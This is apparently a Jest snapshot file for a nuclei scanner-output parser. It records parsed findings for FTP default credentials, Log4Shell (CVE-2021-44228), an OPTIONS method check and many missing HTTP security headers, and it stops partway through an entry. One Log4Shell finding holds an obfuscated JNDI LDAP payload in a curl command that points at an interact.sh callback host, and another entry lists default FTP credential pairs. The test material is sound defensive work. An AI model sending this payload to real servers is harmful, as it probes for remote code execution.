// Jest Snapshot v1, https://goo.gl/fbAQLP

exports[`parses empty result correctly 1`] = `Array []`;

exports[`parses ftp result correctly 1`] = `
Array [
  Object {
    "attributes": Object {
      "author": null,
      "extracted_results": null,
      "ip": "127.0.0.1",
      "matched": "www.example.com:21",
      "matcher_name": null,
      "metadata": Object {
        "password": "default",
        "username": "anonymous",
      },
      "reference": null,
      "tags": null,
      "timestamp": "2021-08-20T22:00:48.088618+02:00",
      "type": "network",
    },
    "category": "ftp-default-credentials",
    "description": "The name of the nuclei rule which triggered the finding: ftp-default-credentials",
    "location": "www.example.com",
    "name": "FTP Service with default credentials",
    "severity": "HIGH",
  },
  Object {
    "attributes": Object {
      "author": null,
      "extracted_results": null,
      "ip": "127.0.0.1",
      "matched": "www.example.com:21",
      "matcher_name": null,
      "metadata": Object {
        "password": "stingray",
        "username": "anonymous",
      },
      "reference": null,
      "tags": null,
      "timestamp": "2021-08-20T22:00:48.161349+02:00",
      "type": "network",
    },
    "category": "ftp-default-credentials",
    "description": "The name of the nuclei rule which triggered the finding: ftp-default-credentials",
    "location": "www.example.com",
    "name": "FTP Service with default credentials",
    "severity": "HIGH",
  },
]
`;

exports[`parses log4shell result correctly 1`] = `
Array [
  Object {
    "attributes": Object {
      "author": Array [
        "melbadry9",
        "dhiyaneshdk",
        "daffainfo",
        "j12934",
      ],
      "curl_command": "curl -X 'GET' -d '' -H 'Host: 10.1.6.107:8080' -H 'User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36' -H 'X-Api-Version: \${\${::-j}\${::-n}\${::-d}\${::-i}:\${::-l}\${::-d}\${::-a}\${::-p}://\${hostName}.c70v8s2ukqds73d3ve90c8y9eheyyyyyc.interact.sh}' 'http://10.1.6.107:8080/'",
      "extracted_results": Array [
        "vuln-log4j-vulnerable-log4j-74bbf59745-h2kqj",
      ],
      "hostname": "10.1.6.107",
      "ip": "10.1.6.107",
      "matched_at": "http://10.1.6.107:8080/",
      "matched_line": null,
      "matcher_name": null,
      "matcher_status": true,
      "metadata": null,
      "path": null,
      "reference": Array [
        "https://github.com/advisories/ghsa-jfh8-c2jp-5v3q",
        "https://www.lunasec.io/docs/blog/log4j-zero-day/",
        "https://gist.github.com/bugbountynights/dde69038573db1c12705edb39f9a704a",
      ],
      "request": null,
      "response": null,
      "tags": Array [
        "cve",
        "cve2021",
        "rce",
        "oast",
        "log4j",
      ],
      "template": undefined,
      "template_id": "CVE-2021-44228",
      "template_url": undefined,
      "timestamp": "2021-12-21T15:36:21.9627479Z",
      "type": "http",
    },
    "category": "CVE-2021-44228",
    "description": "Apache Log4j2 <=2.14.1 JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled.",
    "location": "http://10.1.6.107:8080",
    "name": "Remote code injection in Log4j",
    "severity": "HIGH",
  },
]
`;

exports[`parses results with requests & responses correctly 1`] = `
Array [
  Object {
    "attributes": Object {
      "author": Array [
        "pdteam",
      ],
      "curl_command": "curl -X 'OPTIONS' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36' 'https://example.com'",
      "extracted_results": Array [
        "OPTIONS, GET, HEAD, POST",
      ],
      "hostname": "example.com",
      "ip": "93.184.216.34",
      "matched_at": "https://example.com",
      "matched_line": null,
      "matcher_name": null,
      "matcher_status": true,
      "metadata": null,
      "path": null,
      "reference": null,
      "request": "OPTIONS / HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip

",
      "response": "HTTP/1.1 200 OK
Connection: close
Allow: OPTIONS, GET, HEAD, POST
Cache-Control: max-age=604800
Content-Type: text/html; charset=UTF-8
Date: Fri, 09 Sep 2022 19:56:16 GMT
Expires: Fri, 16 Sep 2022 19:56:16 GMT
Server: EOS (vny/0454)
Content-Length: 0

",
      "tags": Array [
        "misc",
        "generic",
      ],
      "template": "miscellaneous/options-method.yaml",
      "template_id": "options-method",
      "template_url": "https://github.com/projectdiscovery/nuclei-templates/blob/master/miscellaneous/options-method.yaml",
      "timestamp": "2022-09-09T21:56:16.141265+02:00",
      "type": "http",
    },
    "category": "options-method",
    "description": "The name of the nuclei rule which triggered the finding: options-method",
    "location": "https://example.com",
    "name": "Allowed Options Method",
    "severity": "INFORMATIONAL",
  },
]
`;

exports[`parses secureCodeBox.io result correctly 1`] = `
Array [
  Object {
    "attributes": Object {
      "author": Array [
        "yavolo",
        "dwisiswant0",
      ],
      "curl_command": "curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36' 'https://www.securecodebox.io'",
      "extracted_results": null,
      "hostname": "www.securecodebox.io",
      "ip": "34.159.58.69",
      "matched_at": "https://www.securecodebox.io",
      "matched_line": null,
      "matcher_name": null,
      "matcher_status": true,
      "metadata": null,
      "path": null,
      "reference": Array [
        "https://portswigger.net/web-security/dom-based/controlling-the-web-message-source",
      ],
      "request": null,
      "response": null,
      "tags": Array [
        "xss",
        "misc",
      ],
      "template": "miscellaneous/addeventlistener-detect.yaml",
      "template_id": "addeventlistener-detect",
      "template_url": "https://github.com/projectdiscovery/nuclei-templates/blob/master/miscellaneous/addeventlistener-detect.yaml",
      "timestamp": "2022-09-09T21:26:27.762236+02:00",
      "type": "http",
    },
    "category": "addeventlistener-detect",
    "description": "The name of the nuclei rule which triggered the finding: addeventlistener-detect",
    "location": "https://www.securecodebox.io",
    "name": "DOM EventListener detection",
    "severity": "INFORMATIONAL",
  },
  Object {
    "attributes": Object {
      "author": Array [
        "panch0r3d",
      ],
      "curl_command": "curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36' 'https://www.securecodebox.io'",
      "extracted_results": Array [
        "securecodebox@iteratec.com",
      ],
      "hostname": "www.securecodebox.io",
      "ip": "34.159.58.69",
      "matched_at": "https://www.securecodebox.io",
      "matched_line": null,
      "matcher_name": null,
      "matcher_status": true,
      "metadata": null,
      "path": null,
      "reference": null,
      "request": null,
      "response": null,
      "tags": Array [
        "misc",
        "email",
      ],
      "template": "miscellaneous/email-extractor.yaml",
      "template_id": "email-extractor",
      "template_url": "https://github.com/projectdiscovery/nuclei-templates/blob/master/miscellaneous/email-extractor.yaml",
      "timestamp": "2022-09-09T21:26:27.777226+02:00",
      "type": "http",
    },
    "category": "email-extractor",
    "description": "The name of the nuclei rule which triggered the finding: email-extractor",
    "location": "https://www.securecodebox.io",
    "name": "Email Extractor",
    "severity": "INFORMATIONAL",
  },
  Object {
    "attributes": Object {
      "author": Array [
        "dadevel",
      ],
      "curl_command": "curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36' 'https://www.securecodebox.io'",
      "extracted_results": Array [
        "Docusaurus v2.0.1",
      ],
      "hostname": "www.securecodebox.io",
      "ip": "34.159.58.69",
      "matched_at": "https://www.securecodebox.io",
      "matched_line": null,
      "matcher_name": null,
      "matcher_status": true,
      "metadata": null,
      "path": null,
      "reference": Array [
        "https://www.w3schools.com/tags/att_meta_name.asp",
      ],
      "request": null,
      "response": null,
      "tags": Array [
        "tech",
        "cms",
      ],
      "template": "technologies/metatag-cms.yaml",
      "template_id": "metatag-cms",
      "template_url": "https://github.com/projectdiscovery/nuclei-templates/blob/master/technologies/metatag-cms.yaml",
      "timestamp": "2022-09-09T21:26:28.511351+02:00",
      "type": "http",
    },
    "category": "metatag-cms",
    "description": "Generic CMS Detection using html meta generator tag",
    "location": "https://www.securecodebox.io",
    "name": "Metatag CMS Detection",
    "severity": "INFORMATIONAL",
  },
  Object {
    "attributes": Object {
      "author": Array [
        "socketz",
        "geeknik",
        "g4l1t0",
        "convisoappsec",
        "kurohost",
        "dawid-czarnecki",
        "forgedhallpass",
      ],
      "curl_command": "curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36' 'https://www.securecodebox.io'",
      "extracted_results": null,
      "hostname": "www.securecodebox.io",
      "ip": "34.159.58.69",
      "matched_at": "https://www.securecodebox.io",
      "matched_line": null,
      "matcher_name": "referrer-policy",
      "matcher_status": true,
      "metadata": null,
      "path": null,
      "reference": null,
      "request": null,
      "response": null,
      "tags": Array [
        "misconfig",
        "generic",
      ],
      "template": "misconfiguration/http-missing-security-headers.yaml",
      "template_id": "http-missing-security-headers",
      "template_url": "https://github.com/projectdiscovery/nuclei-templates/blob/master/misconfiguration/http-missing-security-headers.yaml",
      "timestamp": "2022-09-09T21:27:13.644349+02:00",
      "type": "http",
    },
    "category": "http-missing-security-headers",
    "description": "This template searches for missing HTTP security headers. The impact of these missing headers can vary.
",
    "location": "https://www.securecodebox.io",
    "name": "HTTP Missing Security Headers",
    "severity": "INFORMATIONAL",
  },
  Object {
    "attributes": Object {
      "author": Array [
        "socketz",
        "geeknik",
        "g4l1t0",
        "convisoappsec",
        "kurohost",
        "dawid-czarnecki",
        "forgedhallpass",
      ],
      "curl_command": "curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36' 'https://www.securecodebox.io'",
      "extracted_results": null,
      "hostname": "www.securecodebox.io",
      "ip": "34.159.58.69",
      "matched_at": "https://www.securecodebox.io",
      "matched_line": null,
      "matcher_name": "access-control-allow-origin",
      "matcher_status": true,
      "metadata": null,
      "path": null,
      "reference": null,
      "request": null,
      "response": null,
      "tags": Array [
        "misconfig",
        "generic",
      ],
      "template": "misconfiguration/http-missing-security-headers.yaml",
      "template_id": "http-missing-security-headers",
      "template_url": "https://github.com/projectdiscovery/nuclei-templates/blob/master/misconfiguration/http-missing-security-headers.yaml",
      "timestamp": "2022-09-09T21:27:13.644671+02:00",
      "type": "http",
    },
    "category": "http-missing-security-headers",
    "description": "This template searches for missing HTTP security headers. The impact of these missing headers can vary.
",
    "location": "https://www.securecodebox.io",
    "name": "HTTP Missing Security Headers",
    "severity": "INFORMATIONAL",
  },
  Object {
    "attributes": Object {
      "author": Array [
        "socketz",
        "geeknik",
        "g4l1t0",
        "convisoappsec",
        "kurohost",
        "dawid-czarnecki",
        "forgedhallpass",
      ],
      "curl_command": "curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36' 'https://www.securecodebox.io'",
      "extracted_results": null,
      "hostname": "www.securecodebox.io",
      "ip": "34.159.58.69",
      "matched_at": "https://www.securecodebox.io",
      "matched_line": null,
      "matcher_name": "access-control-allow-credentials",
      "matcher_status": true,
      "metadata": null,
      "path": null,
      "reference": null,
      "request": null,
      "response": null,
      "tags": Array [
        "misconfig",
        "generic",
      ],
      "template": "misconfiguration/http-missing-security-headers.yaml",
      "template_id": "http-missing-security-headers",
      "template_url": "https://github.com/projectdiscovery/nuclei-templates/blob/master/misconfiguration/http-missing-security-headers.yaml",
      "timestamp": "2022-09-09T21:27:13.644884+02:00",
      "type": "http",
    },
    "category": "http-missing-security-headers",
    "description": "This template searches for missing HTTP security headers. The impact of these missing headers can vary.
",
    "location": "https://www.securecodebox.io",
    "name": "HTTP Missing Security Headers",
    "severity": "INFORMATIONAL",
  },
  Object {
    "attributes": Object {
      "author": Array [
        "socketz",
        "geeknik",
        "g4l1t0",
        "convisoappsec",
        "kurohost",
        "dawid-czarnecki",
        "forgedhallpass",
      ],
      "curl_command": "curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36' 'https://www.securecodebox.io'",
      "extracted_results": null,
      "hostname": "www.securecodebox.io",
      "ip": "34.159.58.69",
      "matched_at": "https://www.securecodebox.io",
      "matched_line": null,
      "matcher_name": "access-control-expose-headers",
      "matcher_status": true,
      "metadata": null,
      "path": null,
      "reference": null,
      "request": null,
      "response": null,
      "tags": Array [
        "misconfig",
        "generic",
      ],
      "template": "misconfiguration/http-missing-security-headers.yaml",
      "template_id": "http-missing-security-headers",
      "template_url": "https://github.com/projectdiscovery/nuclei-templates/blob/master/misconfiguration/http-missing-security-headers.yaml",
      "timestamp": "2022-09-09T21:27:13.644952+02:00",
      "type": "http",
    },
    "category": "http-missing-security-headers",
    "description": "This template searches for missing HTTP security headers. The impact of these missing headers can vary.
",
    "location": "https://www.securecodebox.io",
    "name": "HTTP Missing Security Headers",
    "severity": "INFORMATIONAL",
  },
  Object {
    "attributes": Object {
      "author": Array [
        "socketz",
        "geeknik",
        "g4l1t0",
        "convisoappsec",
        "kurohost",
        "dawid-czarnecki",
        "forgedhallpass",
      ],
      "curl_command": "curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36' 'https://www.securecodebox.io'",
      "extracted_results": null,
      "hostname": "www.securecodebox.io",
      "ip": "34.159.58.69",
      "matched_at": "https://www.securecodebox.io",
      "matched_line": null,
      "matcher_name": "access-control-allow-methods",
      "matcher_status": true,
      "metadata": null,
      "path": null,
      "reference": null,
      "request": null,
      "response": null,
      "tags": Array [
        "misconfig",
        "generic",
      ],
      "template": "misconfiguration/http-missing-security-headers.yaml",
      "template_id": "http-missing-security-headers",
      "template_url": "https://github.com/projectdiscovery/nuclei-templates/blob/master/misconfiguration/http-missing-security-headers.yaml",
      "timestamp": "2022-09-09T21:27:13.645129+02:00",
      "type": "http",
    },
    "category": "http-missing-security-headers",
    "description": "This template searches for missing HTTP security headers. The impact of these missing headers can vary.
",
    "location": "https://www.securecodebox.io",
    "name": "HTTP Missing Security Headers",
    "severity": "INFORMATIONAL",
  },
  Object {
    "attributes": Object {
      "author": Array [
        "socketz",
        "geeknik",
        "g4l1t0",
        "convisoappsec",
        "kurohost",
        "dawid-czarnecki",
        "forgedhallpass",
      ],
      "curl_command": "curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36' 'https://www.securecodebox.io'",
      "extracted_results": null,
      "hostname": "www.securecodebox.io",
      "ip": "34.159.58.69",
      "matched_at": "https://www.securecodebox.io",
      "matched_line": null,
      "matcher_name": "x-content-type-options",
      "matcher_status": true,
      "metadata": null,
      "path": null,
      "reference": null,
      "request": null,
      "response": null,
      "tags": Array [
        "misconfig",
        "generic",
      ],
      "template": "misconfiguration/http-missing-security-headers.yaml",
      "template_id": "http-missing-security-headers",
      "template_url": "https://github.com/projectdiscovery/nuclei-templates/blob/master/misconfiguration/http-missing-security-headers.yaml",
      "timestamp": "2022-09-09T21:27:13.645183+02:00",
      "type": "http",
    },
    "category": "http-missing-security-headers",
    "description": "This template searches for missing HTTP security headers. The impact of these missing headers can vary.
",
    "location": "https://www.securecodebox.io",
    "name": "HTTP Missing Security Headers",
    "severity": "INFORMATIONAL",
  },
  Object {
    "attributes": Object {
      "author": Array [
        "socketz",
        "geeknik",
        "g4l1t0",
        "convisoappsec",
        "kurohost",
        "dawid-czarnecki",
        "forgedhallpass",
      ],
      "curl_command": "curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36' 'https://www.securecodebox.io'",
      "extracted_results": null,
      "hostname": "www.securecodebox.io",
      "ip": "34.159.58.69",
      "matched_at": "https://www.securecodebox.io",
      "matched_line": null,
      "matcher_name": "x-permitted-cross-domain-policies",
      "matcher_status": true,
      "metadata": null,
      "path": null,
      "reference": null,
      "request": null,
      "response": null,
      "tags": Array [
        "misconfig",
        "generic",
      ],
      "template": "misconfiguration/http-missing-security-headers.yaml",
      "template_id": "http-missing-security-headers",
      "template_url": "https://github.com/projectdiscovery/nuclei-templates/blob/master/misconfiguration/http-missing-security-headers.yaml",
      "timestamp": "2022-09-09T21:27:13.655101+02:00",
      "type": "http",
    },
    "category": "http-missing-security-headers",
    "description": "This template searches for missing HTTP security headers. The impact of these missing headers can vary.
",
    "location": "https://www.securecodebox.io",
    "name": "HTTP Missing Security Headers",
    "severity": "INFORMATIONAL",
  },
  Object {
    "attributes": Object {
      "author": Array [
        "socketz",
        "geeknik",
        "g4l1t0",
        "convisoappsec",
        "kurohost",
        "dawid-czarnecki",
        "forgedhallpass",
      ],
      "curl_command": "curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36' 'https://www.securecodebox.io'",
      "extracted_results": null,
      "hostname": "www.securecodebox.io",
      "ip": "34.159.58.69",
      "matched_at": "https://www.securecodebox.io",
      "matched_line": null,
      "matcher_name": "access-control-max-age",
      "matcher_status": true,
      "metadata": null,
      "path": null,
      "reference": null,
      "request": null,
      "response": null,
      "tags": Array [
        "misconfig",
        "generic",
      ],
      "template": "misconfiguration/http-missing-security-headers.yaml",
      "template_id": "http-missing-security-headers",
      "template_url": "https://github.com/projectdiscovery/nuclei-templates/blob/master/misconfiguration/http-missing-security-headers.yaml",
      "timestamp": "2022-09-09T21:27:13.659602+02:00",
      "type": "http",
    },
    "category": "http-missing-security-headers",
    "description": "This template searches for missing HTTP security headers. The impact of these missing headers can vary.
",
    "location": "https://www.securecodebox.io",
    "name": "HTTP Missing Security Headers",
    "severity": "INFORMATIONAL",
  },
  Object {
    "attributes": Object {
      "author": Array [
        "socketz",
        "geeknik",
        "g4l1t0",
        "convisoappsec",
        "kurohost",
        "dawid-czarnecki",
        "forgedhallpass",
      ],
      "curl_command": "curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36' 'https://www.securecodebox.io'",
      "extracted_results": null,
      "hostname": "www.securecodebox.io",
      "ip": "34.159.58.69",
      "matched_at": "https://www.securecodebox.io",
      "matched_line": null,
      "matcher_name": "content-security-policy",
      "matcher_status": true,
      "metadata": null,
      "path": null,
      "reference": null,
      "request": null,
      "response": null,
      "tags": Array [
        "misconfig",
        "generic",
      ],
      "template": "misconfiguration/http-missing-security-headers.yaml",
      "template_id": "http-missing-security-headers",
      "template_url": "https://github.com/projectdiscovery/nuclei-templates/blob/master/misconfiguration/http-missing-security-headers.yaml",
      "timestamp": "2022-09-09T21:27:13.65974+02:00",
      "type": "http",
    },
    "category": "http-missing-security-headers",
    "description": "This template searches for missing HTTP security headers. The impact of these missing headers can vary.
",
    "location": "https://www.securecodebox.io",
    "name": "HTTP Missing Security Headers",
    "severity": "INFORMATIONAL",
  },
  Object {
    "attributes": Object {
      "author": Array [
        "socketz",
        "geeknik",
        "g4l1t0",
        "convisoappsec",
        "kurohost",
        "dawid-czarnecki",
        "forgedhallpass",
      ],
      "curl_command": "curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36' 'https://www.securecodebox.io'",
      "extracted_results": null,
      "hostname": "www.securecodebox.io",
      "ip": "34.159.58.69",
      "matched_at": "https://www.securecodebox.io",
      "matched_line": null,
      "matcher_name": "cross-origin-opener-policy",
      "matcher_status": true,
      "metadata": null,
      "path": null,
      "reference": null,
      "request": null,
      "response": null,
      "tags": Array [
        "misconfig",
        "generic",
      ],
      "template": "misconfiguration/http-missing-security-headers.yaml",
      "template_id": "http-missing-security-headers",
      "template_url": "https://github.com/projectdiscovery/nuclei-templates/blob/master/misconfiguration/http-missing-security-headers.yaml",
      "timestamp": "2022-09-09T21:27:13.659816+02:00",
      "type": "http",
    },
    "category": "http-missing-security-headers",
    "description": "This template searches for missing HTTP security headers. The impact of these missing headers can vary.
",
    "location": "https://www.securecodebox.io",
    "name": "HTTP Missing Security Headers",
    "severity": "INFORMATIONAL",
  },
  Object {
    "attributes": Object {
      "author": Array [
        "socketz",
        "geeknik",
        "g4l1t0",
        "convisoappsec",
        "kurohost",
        "dawid-czarnecki",
        "forgedhallpass",
      ],
      "curl_command": "curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36' 'https://www.securecodebox.io'",
      "extracted_results": null,
      "hostname": "www.securecodebox.io",
      "ip": "34.159.58.69",
      "matched_at": "https://www.securecodebox.io",
      "matched_line": null,
      "matcher_name": "x-frame-options",
      "matcher_status": true,
      "metadata": null,
      "path": null,
      "reference": null,
      "request": null,
      "response": null,
      "tags": Array [
        "misconfig",
        "generic",
      ],
      "template": "misconfiguration/http-missing-security-headers.yaml",
      "template_id": "http-missing-security-headers",
      "template_url": "https://github.com/projectdiscovery/nuclei-templates/blob/master/misconfiguration/http-missing-security-headers.yaml",
      "timestamp": "2022-09-09T21:27:13.659934+02:00",
      "type": "http",
    },
    "category": "http-missing-security-headers",
    "description": "This template searches for missing HTTP security headers. The impact of these missing headers can vary.
",
    "location": "https://www.securecodebox.io",
    "name": "HTTP Missing Security Headers",
    "severity": "INFORMATIONAL",
  },
  Object {
    "attributes": Object {
      "author": Array [
        "socketz",
        "geeknik",
        "g4l1t0",
        "convisoappsec",
        "kurohost",
        "dawid-czarnecki",
        "forgedhallpass",
      ],
      "curl_command": "curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36' 'https://www.securecodebox.io'",
      "extracted_results": null,
      "hostname": "www.securecodebox.io",
      "ip": "34.159.58.69",
      "matched_at": "https://www.securecodebox.io",
      "matched_line": null,
      "matcher_name": "cross-origin-resource-policy",
      "matcher_status": true,
      "metadata": null,
      "path": null,
      "reference": null,
      "request": null,
      "response": null,
      "tags": Array [
        "misconfig",
        "generic",
      ],
      "template": "misconfiguration/http-missing-security-headers.yaml",
      "template_id": "http-missing-security-headers",
      "template_url": "https://github.com/projectdiscovery/nuclei-templates/blob/master/misconfiguration/http-missing-security-headers.yaml",
      "timestamp": "2022-09-09T21:27:13.660006+02:00",
      "type": "http",
    },
    "category": "http-missing-security-headers",
    "description": "This template searches for missing HTTP security headers. The impact of these missing headers can vary.
",
    "location": "https://www.securecodebox.io",
    "name": "HTTP Missing Security Headers",
    "severity": "INFORMATIONAL",
  },
  Object {
    "attributes": Object {
      "author": Array [
        "socketz",
        "geeknik",
        "g4l1t0",
        "convisoappsec",
        "kurohost",
        "dawid-czarnecki",
        "forgedhallpass",
      ],
      "curl_command": "curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36' 'https://www.securecodebox.io'",
      "extracted_results": null,
      "hostname": "www.securecodebox.io",
      "ip": "34.159.58.69",
      "matched_at": "https://www.securecodebox.io",
      "matched_line": null,
      "matcher_name": "cross-origin-embedder-policy",
      "matcher_status": true,
      "metadata": null,
      "path": null,
      "reference": null,
      "request": null,
      "response": null,
      "tags": Array [
        "misconfig",
        "generic",
      ],
      "template": "misconfiguration/http-missing-security-headers.yaml",
      "template_id": "http-missing-security-headers",
      "template_url": "https://github.com/projectdiscovery/nuclei-templates/blob/master/misconfiguration/http-missing-security-headers.yaml",
      "timestamp": "2022-09-09T21:27:13.660065+02:00",
      "type": "http",
    },
    "category": "http-missing-security-headers",
    "description": "This template searches for missing HTTP security headers. The impact of these missing headers can vary.
",
    "location": "https://www.securecodebox.io",
    "name": "HTTP Missing Security Headers",
    "severity": "INFORMATIONAL",
  },
  Object {
    "attributes": Object {
      "author": Array [
        "socketz",
        "geeknik",
        "g4l1t0",
        "convisoappsec",
        "kurohost",
        "dawid-czarnecki",
        "forgedhallpass",
      ],
      "curl_command": "curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36' 'https://www.securecodebox.io'",
      "extracted_results": null,
      "hostname": "www.securecodebox.io",
      "ip": "34.159.58.69",
      "matched_at": "https://www.securecodebox.io",
      "matched_line": null,
      "matcher_name": "access-control-allow-headers",
      "matcher_status": true,
      "metadata": null,
      "path": null,
      "reference": null,
      "request": null,
      "response": null,
      "tags": Array [
        "misconfig",
        "generic",
      ],
      "template": "misconfiguration/http-missing-security-headers.yaml",
      "template_id": "http-missing-security-headers",
      "template_url": "https://github.com/projectdiscovery/nuclei-templates/blob/master/misconfiguration/http-missing-security-headers.yaml",
      "timestamp": "2022-09-09T21:27:13.6601+02:00",
      "type": "http",
    },
    "category": "http-missing-security-headers",
    "description": "This template searches for missing HTTP security headers. The impact of these missing headers can vary.
",
    "location": "https://www.securecodebox.io",
    "name": "HTTP Missing Security Headers",
    "severity": "INFORMATIONAL",
  },
  Object {
    "attributes": Object {
      "author": Array [
        "socketz",
        "geeknik",
        "g4l1t0",
        "convisoappsec",
        "kurohost",
        "dawid-czarnecki",
        "forgedhallpass",
      ],
      "curl_command": "curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36' 'https://www.securecodebox.io'",
      "extracted_results": null,
      "hostname": "www.securecodebox.io",
      "ip": "34.159.58.69",
      "matched_at": "https://www.securecodebox.io",
      "matched_line": null,
      "matcher_name": "permission-policy",
      "matcher_status": true,
      "metadata": null,
      "path": null,
      "reference": null,
      "request": null,
      "response": null,
      "tags": Array [
        "misconfig",
        "generic",
      ],
      "template": "misconfiguration/http-missing-security-headers.yaml",
      "template_id": "http-missing-security-headers",
      "template_url": "https://github.com/projectdiscovery/nuclei-templates/blob/master/misconfiguration/http-missing-security-headers.yaml",
      "timestamp": "2022-09-09T21:27:13.660161+02:00",
      "type": "http",
    },
    "category": "http-missing-security-headers",
    "description": "This template searches for missing HTTP security headers. The impact of these missing headers can vary.
",
    "location": "https://www.securecodebox.io",
    "name": "HTTP Missing Security Headers",
    "severity": "INFORMATIONAL",
  },
  Object {
    "attributes": Object {
      "author": Array [
        "socketz",
        "geeknik",
        "g4l1t0",
        "convisoappsec",
        "kurohost",
        "dawid-czarnecki",
        "forgedhallpass",
      ],
      "curl_command": "curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36' 'https://www.securecodebox.io'",
      "extracted_results": null,
      "hostname": "www.securecodebox.io",
      "ip": "34.159.58.69",
      "matched_at": "https://www.securecodebox.io",
      "matched_line": null,
      "matcher_name": "clear-site-data",
      "matcher_status": true,
      "metadata": null,
      "path": null,
      "reference": null,
      "request": null,
      "response": null,
      "tags": Array [
        "misconfig",
        "generic",
      ],
      "template": "misconfiguration/http-missing-security-headers.yaml",
      "template_id": "http-missing-security-headers",
      "template_url": "https://github.com/projectdiscovery/nuclei-templates/blob/master/misconfiguration/http-missing-security-headers.yaml",
      "timestamp": "2022-09-09T21:27:13.660239+02:00",
      "type": "http",
    },
    "category": "http-missing-security-headers",
    "description": "This template searches for missing HTTP security headers. The impact of these missing headers can vary.
",
    "location": "https://www.securecodebox.io",
    "name": "HTTP Missing Security Headers",
    "severity": "INFORMATIONAL",
  },
  Object {
    "attributes": Object {
      "author": Array [
        "pdteam",
      ],
      "curl_command": null,
      "extracted_results": Array [
        "docs-securecodebox.netlify.app.",
      ],
      "hostname": "www.securecodebox.io",
      "ip": null,
      "matched_at": "https://www.securecodebox.io",
      "matched_line": null,
      "matcher_name": null,
      "matcher_status": true,
      "metadata": null,
